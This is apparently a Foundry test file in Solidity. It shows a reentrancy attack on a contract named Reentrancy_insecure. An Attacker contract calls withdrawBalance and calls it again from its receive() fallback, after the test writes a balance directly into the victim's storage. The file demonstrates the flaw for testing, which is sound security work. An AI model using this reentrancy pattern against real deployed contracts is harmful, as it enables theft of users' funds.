
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_insecure} from "../src/Reentrancy_insecure.sol";

contract TestReentrancyReentrancy_insecure is Test {
    
    Reentrancy_insecure public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_insecure();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 0.1 ether && attackVal < 100 ether);

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal);

        vm.deal(address(this), attackVal * 2);

        // Since the target contract has no deposit function, we manually inject the balance
        // into the private mapping to simulate a user having funds to withdraw.
        // userBalances is at slot 0.
        bytes32 slot = keccak256(abi.encode(address(_attacker), uint256(0)));
        vm.store(address(_contractUnderTest), slot, bytes32(attackVal));
        
        _attacker.setupAttack(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_insecure public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = Reentrancy_insecure(victimAddress);
    }

    function setupAttack(uint256 val) public {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
    }

    function attack(uint256 val) public {
        attackCallCount = 1;
        
        _victim.withdrawBalance();

        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            _victim.withdrawBalance();
        }
    }
}
